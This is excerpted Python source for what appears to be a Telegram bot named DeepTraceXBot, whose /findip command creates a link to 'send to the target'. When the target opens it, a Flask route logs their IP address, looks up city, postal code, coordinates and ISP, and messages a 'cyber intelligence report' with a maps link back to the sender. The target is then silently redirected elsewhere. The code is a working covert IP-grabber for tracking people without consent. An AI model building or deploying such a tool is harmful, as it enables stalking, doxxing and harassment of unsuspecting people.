...
from mongo_db import (
    ...
    save_ip_tracking_request,
    get_ip_tracking_request,
    mark_ip_tracking_completed
)
...
PUBLIC_HELP_MAP = {
    ...
    "/findip": "💡 Usage: /findip - Generate IP tracking link"
}
...
# ===== NEW IP TRACKING ROUTE =====
@app.route("/track/<request_no>")
def track_ip(request_no):
    ...
    try:
        ...
        print(f"[IP TRACKING] Request: {request_no}, IP: {client_ip}")
        
        # Get tracking request from database
        tracking_data = get_ip_tracking_request(request_no)
        
        if not tracking_data:
            return "<h1>Invalid tracking link</h1>", 404
        
        # Check if link is expired (30 minutes)
        expiry_time = datetime.fromisoformat(tracking_data['expiry_time'])
        if datetime.now() > expiry_time:
            return "<h1>This tracking link has expired.</h1>", 410
        
        # Mark as completed
        mark_ip_tracking_completed(request_no)
        
        # Fetch IP data from API
        try:
            ip_response = requests.get(f"{IP_API}{client_ip}", timeout=10)
            ip_data = ip_response.json()
            
            if not ip_data.get('success'):
                raise Exception("API returned no data")
            
            # Build cyber intelligence report
            data = ip_data.get('data', {})
            
            # Get flag emoji and create maps link
            flag_emoji = data.get('Flag', '🏴')
            maps_link = f"https://www.google.com/maps?q={data.get('Latitude', '')},{data.get('Longitude', '')}"
            
            # Build the report message
            report_text = (
                "🛰️ <b>CYBER INTELLIGENCE REPORT</b>\n"
                "━━━━━━━━━━━━━━━━━━\n\n"
                
                "👤 <b>Target Opened Link Of:</b>\n"
                f"• <b>Generator ID:</b> <code>{tracking_data['generator_user_id']}</code>\n"
                f"• <b>Generator Username:</b> @{tracking_data['generator_username']}\n"
                f"• <b>Request No:</b> <code>{request_no}</code>\n\n"
                
                "━━━━━━━━━━━━━━━━━━\n"
                "🌐 <b>IP INFORMATION</b>\n\n"
                
                f"{flag_emoji} <b>IP Address:</b> <code>{data.get('IP', client_ip)}</code>\n\n"
                
                f"🌍 <b>Country:</b> {data.get('Country', 'Unknown')} ({data.get('Country_Code', 'N/A')})\n"
                f"📍 <b>Region:</b> {data.get('Region', 'Unknown')}\n"
                f"🏙️ <b>City:</b> {data.get('City', 'Unknown')}\n"
                f"📮 <b>Postal:</b> {data.get('Postal', 'N/A')}\n"
                f"🗺️ <b>Continent:</b> {data.get('Continent', 'Unknown')}\n\n"
                
                "━━━━━━━━━━━━━━━━━━\n"
                "📡 <b>NETWORK DETAILS</b>\n\n"
                
                f"🔌 <b>ISP:</b> {data.get('ISP', 'Unknown')}\n"
                f"🏢 <b>Organization:</b> {data.get('ORG', 'Unknown')}\n"
                f"🔢 <b>ASN:</b> {data.get('ASN', 'N/A')}\n"
                f"🌐 <b>Domain:</b> {data.get('Domain', 'N/A')}\n\n"
                
                "━━━━━━━━━━━━━━━━━━\n"
                "🧭 <b>GEOLOCATION</b>\n\n"
                
                f"📐 <b>Latitude:</b> {data.get('Latitude', 'N/A')}\n"
                f"📐 <b>Longitude:</b> {data.get('Longitude', 'N/A')}\n"
                ...
                f"⏱️ <b>UTC Offset:</b> {data.get('Timezone_Offset', 'N/A')}\n\n"
                
                "━━━━━━━━━━━━━━━━━━\n"
                "🧬 <b>ADDITIONAL INFO</b>\n\n"
                
                f"📊 <b>IP Type:</b> {data.get('Type', 'Unknown')}\n"
                f"{flag_emoji} <b>Flag:</b> {data.get('Country', 'Unknown')}\n\n"
            ...
            # Send report to the generator
            try:
                send_message(tracking_data['generator_user_id'], report_text)
                print(f"[IP TRACKING] Report sent to user {tracking_data['generator_user_id']}")
            except Exception as e:
                print(f"[IP TRACKING ERROR] Failed to send message: {e}")
            
            # Return success page to the target
            return """
            <!DOCTYPE html>
            <html>
            <head>
            ...
            <body>
                ...
                <script>
                    setTimeout(function() {
                        window.location.href = 'https://t.me/DeepTraceXBot';
                    }, 2000);
                </script>
            </body>
            </html>
            ...
            print(f"[IP TRACKING ERROR] API call failed: {e}")
            # Send error message
            error_msg = (
                "❌ <b>IP Tracking Failed</b>\n\n"
                f"Request No: <code>{request_no}</code>\n"
                f"Captured IP: <code>{client_ip}</code>\n\n"
                "API Error - Unable to fetch detailed information."
            )
            send_message(tracking_data['generator_user_id'], error_msg)
            return "<h1>Link processed, but data fetch failed</h1>", 500
            
    except Exception as e:
        print(f"[IP TRACKING ERROR] General error: {e}")
...
WELCOME_MESSAGE = (
    ...
    "ғɪɴᴅɪᴘ: <code>/findip</code> - Track IP Location\n\n"
...
COMMAND_ORDER = [
    ...
    ("findip", "ғɪɴᴅɪᴘ: /findip - Track IP Location"),
...
# ---------- /trace ----------
    ...
    # ---------- /findip ----------
    if lower.startswith("/findip"):
        # Generate unique request number (8 digit random)
        request_no = ''.join(random.choices(string.digits, k=8))
        ...
        try:
            ...
            if "from" in text:
                username = text.get("from", {}).get("username", "Unknown")
        except:
            username = "Unknown"
        
        # Generate tracking link
        # Use your deployed Render URL or local for testing
        base_url = os.getenv("BASE_URL", "https://deeptracexbot.onrender.com")
        tracking_link = f"{base_url}/track/{request_no}"
        ...
        try:
            ...
            print(f"[FINDIP ERROR] Failed to save to database: {e}")
            send_message(
                chat_id,
        ...
        response_text = (
            "🕵️ <b>IP Tracking Request Generated</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            ...
            "⏳ <b>Link Validity:</b> 30 Minutes\n"
            "🗑 <b>This message will auto-delete in:</b> 60 Seconds\n\n"
            
            "━━━━━━━━━━━━━━━━━━\n"
            "⚠️ Send this link to the target.\n"
            "When they open it, you will receive a full cyber intelligence report."
        )
        ...
        print(f"[FINDIP] Generated tracking link for user {user_id}, request {request_no}")
        return
